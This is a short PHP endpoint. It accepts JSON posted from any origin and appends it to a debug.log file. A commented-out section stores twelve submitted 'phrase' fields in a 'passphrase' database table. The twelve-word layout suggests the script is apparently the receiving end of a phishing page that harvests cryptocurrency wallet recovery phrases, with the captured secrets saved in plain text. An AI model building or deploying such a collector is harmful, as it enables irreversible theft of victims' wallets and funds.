<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *'); // Adjust according to your needs

$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    file_put_contents('debug.log', print_r($data, true), FILE_APPEND);
    echo json_encode(['success' => true]);
} else {
    echo json_encode(['success' => false]);
}


// $res = [
//     'status' => true,
//     'message' => 'success',
// ];
// print_r(json_encode($res));
// exit;
// $servername = "localhost";
// $username = "your_username";
// $password = "your_password";
// $dbname = "your_database";

// // Create connection
// $conn = new mysqli($servername, $username, $password, $dbname);

// // Check connection
// if ($conn->connect_error) {
//     die("Connection failed: " . $conn->connect_error);
// }

// // Check if request method is POST
// if ($_SERVER['REQUEST_METHOD'] == 'POST') {
//     // Get POST data
//     $phrase1 = $_POST['phrase1'];
//     $phrase2 = $_POST['phrase2'];
//     $phrase3 = $_POST['phrase3'];
//     $phrase4 = $_POST['phrase4'];
//     $phrase5 = $_POST['phrase5'];
//     $phrase6 = $_POST['phrase6'];
//     $phrase7 = $_POST['phrase7'];
//     $phrase8 = $_POST['phrase8'];
//     $phrase9 = $_POST['phrase9'];
//     $phrase10 = $_POST['phrase10'];
//     $phrase11 = $_POST['phrase11'];
//     $phrase12 = $_POST['phrase12'];

//     // Prepare and bind
//     $stmt = $conn->prepare("INSERT INTO passphrase (phrase1, phrase2, phrase3, phrase4, phrase5, phrase6, phrase7, phrase8, phrase9, phrase10, phrase11, phrase12) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
//     $stmt->bind_param("ssssssssssss", $phrase1, $phrase2, $phrase3, $phrase4, $phrase5, $phrase6, $phrase7, $phrase8, $phrase9, $phrase10, $phrase11, $phrase12);

//     // Execute the statement
//     if ($stmt->execute()) {
//         echo "New record created successfully";
//     } else {
//         echo "Error: " . $stmt->error;
//     }

//     // Close statement and connection
//     $stmt->close();
// }

// $conn->close();
// ?>
